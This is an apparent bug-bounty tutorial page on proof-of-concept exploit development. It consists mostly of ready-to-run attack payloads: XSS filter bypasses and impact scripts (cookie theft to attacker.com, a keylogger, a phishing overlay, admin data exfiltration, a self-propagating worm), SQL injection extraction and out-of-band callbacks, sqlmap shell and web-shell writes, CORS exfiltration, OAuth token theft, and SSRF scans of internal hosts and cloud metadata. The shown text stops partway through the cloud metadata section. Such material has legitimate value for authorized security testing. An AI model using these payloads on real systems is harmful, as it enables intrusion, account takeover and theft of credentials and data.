---
title: Proof of Concept Development
description: Methodologies, techniques, and commands for building reliable Proof of Concept exploits during bug hunting engagements.
navigation:
  icon: i-lucide-flask-conical
  title: Proof of Concept Development
---

## What is Proof of Concept Development

::note
A Proof of Concept (PoC) is a **functional demonstration** that validates a vulnerability is real, exploitable, and impactful. In bug bounty and security research, a well-crafted PoC separates a duplicate/informational report from a **critical accepted submission**.
::

PoC development is the process of taking a suspected vulnerability and building a **reproducible, reliable exploit** that proves the security impact. It bridges the gap between detection and demonstration.

::callout{icon="i-lucide-target" color="red"}
A PoC must answer three questions: **Can it be triggered?** **What is the impact?** **Is it reproducible?**
::

### Why PoC Matters in Bug Hunting

::card-group
  ::card
  ---
  title: Higher Bounty Payouts
  icon: i-lucide-dollar-sign
  ---
  Programs reward **demonstrated impact**. A working PoC with clear exploitation steps earns significantly more than a theoretical write-up.
  ::

  ::card
  ---
  title: Faster Triage
  icon: i-lucide-zap
  ---
  Security teams can reproduce your finding immediately. Reduces back-and-forth and **speeds up validation** from weeks to hours.
  ::

  ::card
  ---
  title: Avoids Duplicates
  icon: i-lucide-shield-check
  ---
  A unique exploitation chain or novel PoC can differentiate your report even if the root vulnerability is already known.
  ::

  ::card
  ---
  title: Proves Severity
  icon: i-lucide-flame
  ---
  Demonstrating **account takeover**, **data exfiltration**, or **RCE** with a PoC justifies Critical/High severity ratings.
  ::
::

### PoC Development Workflow

::steps{level="4"}

#### Identify the Vulnerability Class

Determine the exact vulnerability type — XSS, SSRF, IDOR, SQLi, RCE, Authentication Bypass, etc.

```bash
# Fingerprint the technology stack
whatweb https://target.com
wappalyzer https://target.com
httpx -u https://target.com -tech-detect -status-code -title
```

#### Confirm the Attack Surface

Map the vulnerable endpoint, parameters, headers, or functionality.

```bash
# Discover parameters on the target endpoint
arjun -u https://target.com/api/endpoint -m GET POST
paramspider -d target.com --exclude woff,css,js,png,svg,jpg
```

#### Build the Initial Payload

Craft the simplest possible payload that triggers the vulnerability.

```bash
# Example: Basic XSS confirmation
curl -s "https://target.com/search?q=<script>alert(document.domain)</script>"

# Example: Basic SQLi confirmation
curl -s "https://target.com/user?id=1' OR '1'='1"

# Example: Basic SSRF confirmation
curl -s "https://target.com/fetch?url=http://burpcollaborator.net"
```

#### Escalate the Impact

Transform a low-impact trigger into a high-impact exploit demonstrating real-world damage.

```bash
# XSS → Cookie Theft
curl -s "https://target.com/search?q=<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"

# SSRF → Cloud Metadata Access
curl -s "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# IDOR → Mass Data Exfiltration
for i in $(seq 1 1000); do curl -s "https://target.com/api/user/$i" -H "Authorization: Bearer TOKEN"; done
```

#### Document and Report

Package the PoC with full reproduction steps, screenshots, HTTP requests/responses, and impact statement.

```bash
# Record full HTTP interaction
curl -v -o response.html "https://target.com/vuln?param=PAYLOAD" 2>&1 | tee poc_log.txt
```

::

---

## PoC Methodology Framework

::tip
The best PoCs follow a structured methodology: **Discover → Confirm → Bypass → Escalate → Chain → Document**.
::

::accordion
  ::accordion-item
  ---
  icon: i-lucide-search
  label: "Step 1: Discovery & Confirmation"
  ---

  Before building a PoC, confirm the vulnerability exists with a **non-destructive** canary payload.

  **Confirmation Techniques by Vulnerability Class:**

  | Vulnerability | Canary Payload | Confirmation Signal |
  | --- | --- | --- |
  | Reflected XSS | `<test123>` | Tag reflected unencoded in response |
  | Stored XSS | `"><img src=x>` | Broken image rendered on page |
  | Blind SQLi | `' AND SLEEP(5)--` | Response delayed by 5 seconds |
  | SSRF | `http://burpcollaborator.net` | DNS/HTTP callback received |
  | SSTI | `{{7*7}}` | `49` rendered in response |
  | Command Injection | `` `sleep 5` `` | Response delayed by 5 seconds |
  | Path Traversal | `../../../../etc/passwd` | Root user entries in response |
  | Open Redirect | `//evil.com` | 302 redirect to external domain |

  ```bash
  # Automated canary injection across parameters
  echo "https://target.com/page?q=FUZZ&ref=FUZZ" | qsreplace '<poc123>' | \
    httpx -mc 200 -mr '<poc123>'

  # Time-based blind SQLi confirmation
  curl -o /dev/null -s -w "%{time_total}\n" \
    "https://target.com/user?id=1' AND SLEEP(5)-- -"

  # SSTI canary across multiple template engines
  echo '{{7*7}}' | httpx -u "https://target.com/render?tpl=FUZZ" -mr "49"
  echo '${7*7}' | httpx -u "https://target.com/render?tpl=FUZZ" -mr "49"
  echo '<%= 7*7 %>' | httpx -u "https://target.com/render?tpl=FUZZ" -mr "49"
  ```
  ::

  ::accordion-item
  ---
  icon: i-lucide-shield-off
  label: "Step 2: Filter & WAF Bypass"
  ---

  Most targets have security filters. A successful PoC must **bypass protections** to demonstrate real-world exploitability.

  **Common Bypass Strategies:**

  - HTML entity encoding
  - Double URL encoding
  - Case variation
  - Null byte injection
  - Unicode normalization
  - Chunked transfer encoding
  - HTTP parameter pollution

  ```bash
  # Double URL encoding bypass
  curl -s "https://target.com/search?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E"

  # Case variation bypass
  curl -s "https://target.com/search?q=<ScRiPt>alert(1)</ScRiPt>"

  # Event handler bypass (no script tags)
  curl -s "https://target.com/search?q=<img src=x onerror=alert(1)>"

  # SVG-based XSS bypass
  curl -s "https://target.com/search?q=<svg/onload=alert(1)>"

  # JavaScript protocol bypass
  curl -s "https://target.com/redirect?url=javascript:alert(document.domain)"

  # Null byte injection for path traversal
  curl -s "https://target.com/file?name=../../../../etc/passwd%00.png"

  # Unicode normalization SSRF bypass
  curl -s "https://target.com/fetch?url=http://⑯⑨。②⑤④。⑯⑨。②⑤④/"

  # HTTP Parameter Pollution
  curl -s "https://target.com/api?user_id=attacker&user_id=victim"

  # Chunked transfer encoding for WAF bypass
  printf 'POST /api/login HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\n\r\n3\r\n{"a\r\n5\r\n":"1"}\r\n0\r\n\r\n' | \
    ncat target.com 443 --ssl
  ```
  ::

  ::accordion-item
  ---
  icon: i-lucide-trending-up
  label: "Step 3: Impact Escalation"
  ---

  Transform a simple trigger into a **maximum impact** demonstration.

  ::collapsible
  **Escalation Paths by Vulnerability:**

  | From | To | Technique |
  | --- | --- | --- |
  | Self-XSS | Stored XSS | Chain with CSRF to inject payload via victim action |
  | Reflected XSS | Account Takeover | Steal session cookies or OAuth tokens |
  | SSRF | RCE | Access cloud metadata → retrieve IAM credentials → execute commands |
  | IDOR | Mass Data Breach | Enumerate all user records via predictable IDs |
  | SQLi | Full Database Dump | Extract all tables, credentials, PII |
  | SSTI | RCE | Escape sandbox to execute system commands |
  | Open Redirect | OAuth Token Theft | Redirect OAuth callback to attacker-controlled server |
  | Path Traversal | Source Code Leak | Read application config files with credentials |
  ::

  ```bash
  # XSS → Account Takeover via cookie theft
  # Payload:
  # <script>
  # fetch('https://attacker.com/log?cookie='+document.cookie)
  # </script>

  # SSRF → AWS credential theft
  curl -s "https://target.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"

  # Use stolen AWS credentials
  export AWS_ACCESS_KEY_ID="AKIA..."
  export AWS_SECRET_ACCESS_KEY="secret..."
  export AWS_SESSION_TOKEN="token..."
  aws s3 ls
  aws sts get-caller-identity

  # SQLi → Full database extraction
  sqlmap -u "https://target.com/user?id=1" --dbs --batch
  sqlmap -u "https://target.com/user?id=1" -D dbname --tables --batch
  sqlmap -u "https://target.com/user?id=1" -D dbname -T users --dump --batch

  # SSTI → RCE (Jinja2)
  curl -s "https://target.com/render?tpl={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"

  # SSTI → RCE (Twig)
  curl -s "https://target.com/render?tpl={{['id']|filter('system')}}"

  # Open Redirect → OAuth token theft
  # Craft malicious authorization URL:
  # https://target.com/oauth/authorize?client_id=app&redirect_uri=https://target.com/callback/..%2F..%2Fredirect%3Furl%3Dhttps://attacker.com&response_type=token
  ```

  ::accordion-item
  ---
  icon: i-lucide-link
  label: "Step 4: Vulnerability Chaining"
  ---

  Combine multiple lower-severity issues into a **critical exploit chain**.

  ```
  ┌─────────────────────────────────────────────────────────────┐
  │                  VULNERABILITY CHAINING                     │
  │                                                             │
  │  ┌──────────┐    ┌──────────┐    ┌──────────┐             │
  │  │  Low /   │───▶│  Medium  │───▶│ Critical │             │
  │  │  Info    │    │  Impact  │    │  Impact  │             │
  │  └──────────┘    └──────────┘    └──────────┘             │
  │                                                             │
  │  Examples:                                                  │
  │  ─────────                                                  │
  │  Self-XSS + CSRF = Stored XSS (Account Takeover)          │
  │  SSRF + Cloud Metadata = RCE (Infrastructure Compromise)   │
  │  Open Redirect + OAuth = Token Theft (Account Takeover)    │
  │  Info Disclosure + IDOR = PII Leak (Data Breach)           │
  │  Race Condition + Payment = Financial Loss                  │
  │  CORS Misconfig + Sensitive Endpoint = Data Exfiltration   │
  └─────────────────────────────────────────────────────────────┘
  ```

  **Chain 1: Self-XSS + CSRF → Account Takeover**

  ```html
  <!-- CSRF page that triggers Self-XSS on victim -->
  <html>
  <body>
    <form id="csrf" action="https://target.com/profile/update" method="POST">
      <input name="bio" value='"><script>fetch("https://attacker.com/steal?t="+document.cookie)</script>' />
    </form>
    <script>document.getElementById('csrf').submit();</script>
  </body>
  </html>
  ```

  **Chain 2: Open Redirect + OAuth → Token Theft**

  ```bash
  # Step 1: Find open redirect
  curl -v "https://target.com/redirect?url=https://attacker.com" 2>&1 | grep "Location:"

  # Step 2: Abuse OAuth flow with redirect
  # Malicious URL:
  echo "https://accounts.google.com/o/oauth2/auth?client_id=TARGET_CLIENT_ID&redirect_uri=https://target.com/redirect?url=https://attacker.com&response_type=token&scope=email"
  ```

  **Chain 3: CORS Misconfiguration + Sensitive API → Data Exfiltration**

  ```bash
  # Step 1: Test CORS misconfiguration
  curl -s -H "Origin: https://attacker.com" \
    -I "https://target.com/api/user/profile" | grep -i "access-control"

  # Step 2: Build exfiltration page
  cat << 'EOF' > cors_exploit.html
  <script>
  fetch('https://target.com/api/user/profile', {credentials: 'include'})
    .then(r => r.json())
    .then(d => fetch('https://attacker.com/exfil', {
      method: 'POST',
      body: JSON.stringify(d)
    }));
  </script>
  EOF
  ```
  ::

  ::accordion-item
  ---
  icon: i-lucide-file-text
  label: "Step 5: Documentation & Reporting"
  ---

  A PoC without proper documentation is **wasted effort**.

  **Report Structure:**

  1. **Title** — Clear, specific vulnerability title
  2. **Severity** — CVSS score with justification
  3. **Affected Endpoint** — Full URL and parameters
  4. **Reproduction Steps** — Numbered, exact steps
  5. **PoC Payload** — Working exploit code
  6. **Impact Statement** — What an attacker can achieve
  7. **Evidence** — Screenshots, HTTP logs, video
  8. **Remediation** — Suggested fix

  ```bash
  # Capture full HTTP request/response for evidence
  curl -v -X POST "https://target.com/api/vulnerable" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"param":"PAYLOAD"}' \
    2>&1 | tee full_poc_evidence.txt

  # Generate timestamp proof
  date -u && curl -s "https://target.com/vuln?poc=true" | md5sum

  # Record terminal session for video proof
  asciinema rec poc_demo.cast
  ```
  ::
---

## XSS Proof of Concept Techniques

::badge
Critical
::

### Payload Delivery Methods

::tabs
  ::tabs-item{icon="i-lucide-code" label="Reflected XSS"}

  **Basic Reflected XSS Payloads:**

  ```bash
  # Standard script injection
  curl -s "https://target.com/search?q=<script>alert(document.domain)</script>"

  # Event handler based
  curl -s "https://target.com/search?q=<img src=x onerror=alert(document.domain)>"

  # SVG injection
  curl -s "https://target.com/search?q=<svg onload=alert(document.domain)>"

  # Body event handler
  curl -s "https://target.com/search?q=<body onload=alert(document.domain)>"

  # Input autofocus
  curl -s "https://target.com/search?q=\"><input autofocus onfocus=alert(document.domain)>"

  # Details/Summary tag
  curl -s "https://target.com/search?q=<details open ontoggle=alert(document.domain)>"

  # Marquee tag
  curl -s "https://target.com/search?q=<marquee onstart=alert(document.domain)>"

  # Video tag with source error
  curl -s "https://target.com/search?q=<video><source onerror=alert(document.domain)>"
  ```

  **Automated Reflected XSS Scanning:**

  ```bash
  # Using dalfox
  echo "https://target.com/search?q=test" | dalfox pipe --blind https://attacker.xss.ht

  # Using kxss for reflection detection
  cat urls.txt | kxss | grep -v "Not Reflected"

  # Batch parameter fuzzing
  cat params.txt | while read url; do
    dalfox url "$url" --silence --only-poc
  done

  # Using gxss for reflection analysis
  cat urls.txt | gxss -p test123 | sort -u
  ```
  ::

  ::tabs-item{icon="i-lucide-code" label="Stored XSS"}

  **Stored XSS Injection Points:**

  ```bash
  # Profile fields
  curl -X POST "https://target.com/api/profile" \
    -H "Authorization: Bearer TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"name":"<script>alert(document.domain)</script>","bio":"test"}'

  # Comment sections
  curl -X POST "https://target.com/api/comments" \
    -H "Authorization: Bearer TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"body":"<img src=x onerror=alert(document.domain)>","post_id":1}'

  # File upload - SVG with embedded script
  cat << 'EOF' > xss.svg
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
    <text x="10" y="20">XSS PoC</text>
  </svg>
  EOF
  curl -X POST "https://target.com/upload" \
    -H "Authorization: Bearer TOKEN" \
    -F "file=@xss.svg;type=image/svg+xml"

  # Markdown injection (if rendered)
  curl -X POST "https://target.com/api/post" \
    -H "Authorization: Bearer TOKEN" \
    -d 'content=[Click](javascript:alert(document.domain))'

  # Email header injection for stored XSS in admin panels
  curl -X POST "https://target.com/contact" \
    -d "name=<script>alert(1)</script>&email=test@test.com&message=hello"

  # File name based stored XSS
  touch '"><img src=x onerror=alert(document.domain)>.png'
  curl -X POST "https://target.com/upload" \
    -F "file=@\"><img src=x onerror=alert(document.domain)>.png"
  ```
  ::

  ::tabs-item{icon="i-lucide-code" label="DOM XSS"}

  **DOM XSS Source & Sink Analysis:**

  ```
  ┌─────────────────────────────────────────────────────┐
  │                   DOM XSS FLOW                      │
  │                                                     │
  │   SOURCES              SINKS                        │
  │   ───────              ─────                        │
  │   location.hash   ──▶  innerHTML                    │
  │   location.search ──▶  document.write               │
  │   document.referrer──▶ eval()                       │
  │   window.name     ──▶  setTimeout()                 │
  │   postMessage     ──▶  jQuery.html()                │
  │   localStorage    ──▶  element.src                  │
  │   document.cookie ──▶  location.href                │
  └─────────────────────────────────────────────────────┘
  ```

  ```bash
  # Fragment-based DOM XSS
  # URL: https://target.com/page#<img src=x onerror=alert(1)>
  echo "https://target.com/page#<img src=x onerror=alert(1)>"

  # postMessage DOM XSS exploitation
  cat << 'EOF' > dom_xss_poc.html
  <iframe src="https://target.com/page" id="victim"></iframe>
  <script>
  document.getElementById('victim').onload = function() {
    this.contentWindow.postMessage('<img src=x onerror=alert(document.domain)>', '*');
  };
  </script>
  EOF

  # window.name based DOM XSS
  cat << 'EOF' > windowname_xss.html
  <script>
  window.name = '<img src=x onerror=alert(document.domain)>';
  window.location = 'https://target.com/vulnerable-page';
  </script>
  EOF

  # DOM Clobbering attack
  curl -s "https://target.com/page" | grep -E "getElementById|getElementsByName|querySelector"
  ```

  **Automated DOM XSS Discovery:**

  ```bash
  # Using DOM XSS scanner
  cat urls.txt | while read url; do
    python3 domxss-scanner.py -u "$url"
  done

  # Extract JavaScript files for source/sink analysis
  cat urls.txt | getJS | while read jsfile; do
    curl -s "$jsfile" | grep -oE "(innerHTML|document\.write|eval\(|\.html\(|location\.|window\.name)" | sort -u
  done

  # RetireJS for vulnerable library detection
  retire --js --node --path ./js_files/
  ```
  ::
::

### XSS Filter Bypass Techniques

::collapsible

**Comprehensive Bypass Payloads:**

| Bypass Type | Payload |
| --- | --- |
| No parentheses | `<script>alert\`1\`</script>` |
| No script tag | `<img src=x onerror=alert(1)>` |
| No alert keyword | `<script>confirm(1)</script>` |
| No angle brackets | `javascript:alert(1)` (in href/src) |
| Double encoding | `%253Cscript%253Ealert(1)%253C/script%253E` |
| Unicode escape | `<script>\u0061lert(1)</script>` |
| HTML entities | `<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>` |
| Null byte | `<scri%00pt>alert(1)</script>` |
| Tag nesting | `<scr<script>ipt>alert(1)</scr</script>ipt>` |
| Constructor abuse | `<script>[].constructor.constructor('alert(1)')()</script>` |
| SVG animate | `<svg><animate onbegin=alert(1) attributeName=x>` |
| Math tag | `<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)>` |

::

```bash
# No parentheses bypass
curl -s "https://target.com/search?q=<script>onerror=alert;throw+1</script>"

# Template literal bypass
curl -s "https://target.com/search?q=<script>alert\`document.domain\`</script>"

# Fetch API without parentheses
curl -s "https://target.com/search?q=<script>throw/a]/.source+self[\`al\`%2B\`ert\`]\\(1\\)</script>"

# Constructor chain (no function names filtered)
curl -s "https://target.com/search?q=<script>[].constructor.constructor('return+this')().alert(1)</script>"

# Mutation XSS (mXSS) via DOMPurify bypass
curl -s "https://target.com/search?q=<form><math><mtext></form><form><mglyph><svg><mtext><style><img+src+onerror=alert(1)>"

# Polyglot XSS payload
curl -s "https://target.com/search?q=jaVasCript:/*-/*\`/*\\/*'/*\"/**/(/*+*/oNcliCk=alert()+)//%250telerik%252telerik11telerik/telerik/*/alert(1)//"

# CSP bypass via JSONP endpoint
curl -s "https://target.com/search?q=<script+src='https://accounts.google.com/o/oauth2/revoke?callback=alert(1)'></script>"

# CSP bypass via base tag injection
curl -s "https://target.com/search?q=<base+href='https://attacker.com/'>"
```

### XSS Impact Escalation PoCs

::code-collapse

```javascript
// PoC 1: Session Hijacking
<script>
var img = new Image();
img.src = "https://attacker.com/steal?cookie=" + encodeURIComponent(document.cookie);
</script>

// PoC 2: Keylogger
<script>
document.addEventListener('keypress', function(e) {
  fetch('https://attacker.com/keys?k=' + e.key);
});
</script>

// PoC 3: Phishing via DOM manipulation
<script>
document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;padding:50px;text-align:center;"><h2>Session Expired</h2><form action="https://attacker.com/phish" method="POST"><input name="email" placeholder="Email"><input name="password" type="password" placeholder="Password"><button>Login</button></form></div>';
</script>

// PoC 4: CSRF Token Theft + Action Execution
<script>
fetch('/api/user/settings')
  .then(r => r.text())
  .then(html => {
    var token = html.match(/csrf_token.*?value="(.*?)"/)[1];
    fetch('/api/user/email/change', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'csrf=' + token + '&email=attacker@evil.com'
    });
  });
</script>

// PoC 5: Admin Panel Exploitation
<script>
fetch('/admin/users')
  .then(r => r.json())
  .then(users => {
    fetch('https://attacker.com/exfil', {
      method: 'POST',
      body: JSON.stringify(users)
    });
  });
</script>

// PoC 6: Cryptocurrency Miner Injection (Impact Demo Only)
<script>
// Demonstrates potential for cryptojacking
var s = document.createElement('script');
s.src = 'https://attacker.com/miner.js';
document.head.appendChild(s);
</script>

// PoC 7: Worm-like Self-Propagating XSS
<script>
fetch('/api/post', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    content: '<script>fetch("/api/post",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:document.currentScript.outerHTML})})<\/script>'
  })
});
</script>
```

::

---

## SQL Injection PoC Techniques

::badge
Critical
::

### Detection and Confirmation

::tabs
  ::tabs-item{icon="i-lucide-search" label="Error-Based"}

  ```bash
  # MySQL error-based detection
  curl -s "https://target.com/user?id=1'" | grep -iE "sql|syntax|mysql|mariadb"
  curl -s "https://target.com/user?id=1' AND extractvalue(1,concat(0x7e,version()))-- -"

  # PostgreSQL error-based
  curl -s "https://target.com/user?id=1' AND CAST(version() AS int)-- -"

  # MSSQL error-based
  curl -s "https://target.com/user?id=1' AND 1=CONVERT(int,@@version)-- -"

  # Oracle error-based
  curl -s "https://target.com/user?id=1' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v\$version WHERE ROWNUM=1))-- -"

  # SQLite error-based
  curl -s "https://target.com/user?id=1' AND 1=CAST((SELECT sqlite_version()) AS int)-- -"
  ```
  ::

  ::tabs-item{icon="i-lucide-clock" label="Time-Based Blind"}

  ```bash
  # MySQL time-based
  curl -o /dev/null -s -w "Time: %{time_total}s\n" \
    "https://target.com/user?id=1' AND IF(1=1,SLEEP(5),0)-- -"

  # PostgreSQL time-based
  curl -o /dev/null -s -w "Time: %{time_total}s\n" \
    "https://target.com/user?id=1'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -"

  # MSSQL time-based
  curl -o /dev/null -s -w "Time: %{time_total}s\n" \
    "https://target.com/user?id=1'; WAITFOR DELAY '0:0:5'-- -"

  # SQLite time-based (heavy query)
  curl -o /dev/null -s -w "Time: %{time_total}s\n" \
    "https://target.com/user?id=1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- -"

  # Automated time-based extraction
  for i in $(seq 1 50); do
    char=$(curl -o /dev/null -s -w "%{time_total}" \
      "https://target.com/user?id=1' AND IF(ASCII(SUBSTRING(database(),$i,1))>96,SLEEP(2),0)-- -")
    echo "Position $i: ${char}s delay"
  done
  ```
  ::

  ::tabs-item{icon="i-lucide-toggle-left" label="Boolean-Based Blind"}

  ```bash
  # Boolean-based detection
  # True condition (normal response)
  curl -s "https://target.com/user?id=1' AND 1=1-- -" | wc -c
  # False condition (different response)
  curl -s "https://target.com/user?id=1' AND 1=2-- -" | wc -c

  # Extract database name character by character
  curl -s "https://target.com/user?id=1' AND ASCII(SUBSTRING(database(),1,1))>100-- -"

  # Automated boolean-based extraction script
  #!/bin/bash
  URL="https://target.com/user?id=1"
  RESULT=""
  for pos in $(seq 1 30); do
    for ascii in $(seq 32 126); do
      response=$(curl -s "${URL}'+AND+ASCII(SUBSTRING(database(),${pos},1))=${ascii}--+-" | wc -c)
      if [ "$response" -gt "5000" ]; then
        char=$(printf "\\$(printf '%03o' $ascii)")
        RESULT="${RESULT}${char}"
        echo "Found: $RESULT"
        break
      fi
    done
  done
  echo "Database: $RESULT"
  ```
  ::

  ::tabs-item{icon="i-lucide-layers" label="UNION-Based"}

  ```bash
  # Determine column count
  curl -s "https://target.com/user?id=1' ORDER BY 1-- -"
  curl -s "https://target.com/user?id=1' ORDER BY 2-- -"
  curl -s "https://target.com/user?id=1' ORDER BY 5-- -"
  # Error at ORDER BY 5 = 4 columns

  # Find printable column
  curl -s "https://target.com/user?id=-1' UNION SELECT 1,2,3,4-- -"

  # Extract version
  curl -s "https://target.com/user?id=-1' UNION SELECT 1,version(),3,4-- -"

  # Extract database names
  curl -s "https://target.com/user?id=-1' UNION SELECT 1,GROUP_CONCAT(schema_name),3,4 FROM information_schema.schemata-- -"

  # Extract table names
  curl -s "https://target.com/user?id=-1' UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -"

  # Extract column names
  curl -s "https://target.com/user?id=-1' UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='users'-- -"

  # Dump credentials
  curl -s "https://target.com/user?id=-1' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3,4 FROM users-- -"
  ```
  ::

  ::tabs-item{icon="i-lucide-radio" label="Out-of-Band"}

  ```bash
  # MySQL OOB via DNS
  curl -s "https://target.com/user?id=1' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\a'))-- -"

  # MSSQL OOB via DNS
  curl -s "https://target.com/user?id=1'; EXEC master..xp_dirtree '\\\\attacker.burpcollaborator.net\\a'-- -"

  # PostgreSQL OOB via COPY
  curl -s "https://target.com/user?id=1'; COPY (SELECT version()) TO PROGRAM 'curl https://attacker.com/?data='||version()-- -"

  # Oracle OOB via UTL_HTTP
  curl -s "https://target.com/user?id=1' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v\$version WHERE ROWNUM=1))=1-- -"
  ```
  ::
::

### SQLMap Advanced Usage

::code-collapse

```bash
# Basic SQLMap scan
sqlmap -u "https://target.com/user?id=1" --batch --random-agent

# POST request injection
sqlmap -u "https://target.com/api/login" --data "username=admin&password=test" \
  --batch --random-agent --level 5 --risk 3

# Cookie-based injection
sqlmap -u "https://target.com/dashboard" --cookie "session=abc123; user_id=1*" \
  --batch --level 5

# Header injection
sqlmap -u "https://target.com/api/data" --headers "X-Forwarded-For: 1*\nX-Custom: test" \
  --batch --level 5

# JSON body injection
sqlmap -u "https://target.com/api/search" --data '{"query":"test*","page":1}' \
  --content-type "application/json" --batch

# Through authenticated session (saved request)
sqlmap -r request.txt --batch --dbs

# WAF bypass with tamper scripts
sqlmap -u "https://target.com/user?id=1" --tamper=space2comment,between,randomcase \
  --random-agent --batch

# Multiple tamper scripts for heavy WAF
sqlmap -u "https://target.com/user?id=1" \
  --tamper=apostrophemask,base64encode,between,bluecoat,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,percentage,randomcase,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes \
  --random-agent --batch --level 5 --risk 3

# SQLMap proxy through Burp for analysis
sqlmap -u "https://target.com/user?id=1" --proxy="http://127.0.0.1:8080" --batch

# OS shell via SQLi (MySQL)
sqlmap -u "https://target.com/user?id=1" --os-shell --batch

# File read via SQLi
sqlmap -u "https://target.com/user?id=1" --file-read="/etc/passwd" --batch

# File write via SQLi
sqlmap -u "https://target.com/user?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php" --batch

# Second-order injection
sqlmap -u "https://target.com/register" --data "username=test&password=test" \
  --second-url "https://target.com/profile" --batch

# Crawl and test all parameters
sqlmap -u "https://target.com/" --crawl=3 --batch --forms

# Custom injection point marker
sqlmap -u "https://target.com/api/v1/users" --data "filter=name%20eq%20'INJECT_HERE*'" --batch
```

::

### SQLi Filter Bypass Techniques

```bash
# Space bypass alternatives
# Using comments
curl -s "https://target.com/user?id=1'/**/AND/**/1=1--+-"

# Using tabs
curl -s "https://target.com/user?id=1'%09AND%091=1--+-"

# Using newlines
curl -s "https://target.com/user?id=1'%0aAND%0a1=1--+-"

# Using parentheses
curl -s "https://target.com/user?id=1'AND(1=1)--+-"

# Keyword bypass - UNION
curl -s "https://target.com/user?id=1'%55NION%53ELECT+1,2,3--+-"
curl -s "https://target.com/user?id=1'UNI%4FN+SELECT+1,2,3--+-"
curl -s "https://target.com/user?id=1'/*!UNION*/+/*!SELECT*/+1,2,3--+-"

# Quote bypass
curl -s "https://target.com/user?id=1 AND 1=(SELECT COUNT(*) FROM users WHERE username=CHAR(97,100,109,105,110))--+-"

# Comma bypass
curl -s "https://target.com/user?id=-1' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--+-"

# Equals sign bypass
curl -s "https://target.com/user?id=1' AND 1 LIKE 1--+-"
curl -s "https://target.com/user?id=1' AND 1 REGEXP 1--+-"
curl -s "https://target.com/user?id=1' AND 1 BETWEEN 1 AND 1--+-"

# WAF bypass with HTTP parameter pollution
curl -s "https://target.com/user?id=1&id=' UNION SELECT 1,2,3--+-"
```

---

## Server-Side Request Forgery (SSRF) PoC Techniques

::badge
Critical
::

### SSRF Detection Methods

::tabs
  ::tabs-item{icon="i-lucide-radar" label="Basic SSRF"}

  ```bash
  # Basic external SSRF detection
  curl -s "https://target.com/api/fetch?url=http://BURP_COLLABORATOR_URL"
  curl -s "https://target.com/api/proxy?url=http://ATTACKER_SERVER"

  # Common SSRF-prone parameters
  # url, uri, path, dest, redirect, next, data, reference, site, html, val
  # src, page, feed, host, port, to, out, view, dir, show, domain, callback
  # return, file, document, folder, root, link, navigate, open, load

  # Batch SSRF parameter testing
  cat << 'EOF' > ssrf_params.txt
  url
  uri
  path
  dest
  redirect
  site
  html
  src
  page
  feed
  host
  callback
  file
  document
  load
  link
  open
  navigate
  EOF

  while read param; do
    response=$(curl -o /dev/null -s -w "%{http_code}" \
      "https://target.com/api/fetch?${param}=http://BURP_COLLABORATOR")
    echo "$param: $response"
  done < ssrf_params.txt
  ```
  ::

  ::tabs-item{icon="i-lucide-lock" label="Internal SSRF"}

  ```bash
  # Internal network scanning via SSRF
  for port in 80 443 8080 8443 3000 5000 6379 27017 3306 5432 9200 11211; do
    response=$(curl -o /dev/null -s -w "%{http_code}:%{time_total}" \
      "https://target.com/fetch?url=http://127.0.0.1:${port}")
    echo "Port $port: $response"
  done

  # Internal IP range scanning
  for ip in $(seq 1 254); do
    response=$(curl -o /dev/null -s -w "%{http_code}" --max-time 3 \
      "https://target.com/fetch?url=http://192.168.1.${ip}:80")
    echo "192.168.1.$ip: $response"
  done

  # Common internal service endpoints
  curl -s "https://target.com/fetch?url=http://127.0.0.1:6379/INFO"        # Redis
  curl -s "https://target.com/fetch?url=http://127.0.0.1:9200/_cluster/health"  # Elasticsearch
  curl -s "https://target.com/fetch?url=http://127.0.0.1:11211/stats"      # Memcached
  curl -s "https://target.com/fetch?url=http://127.0.0.1:5984/_all_dbs"    # CouchDB
  curl -s "https://target.com/fetch?url=http://127.0.0.1:8500/v1/agent/self" # Consul
  curl -s "https://target.com/fetch?url=http://127.0.0.1:2379/version"     # etcd
  ```
  ::

  ::tabs-item{icon="i-lucide-cloud" label="Cloud Metadata"}

  ```bash
  # AWS metadata endpoint (IMDSv1)
  curl -s "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
  curl -s "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  curl -s "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
  curl -s "https://target.com/fetch?url=http://169.254.169.254/latest/user-data"

  # AWS IMDSv2 (requires token - usually blocked by SSRF)
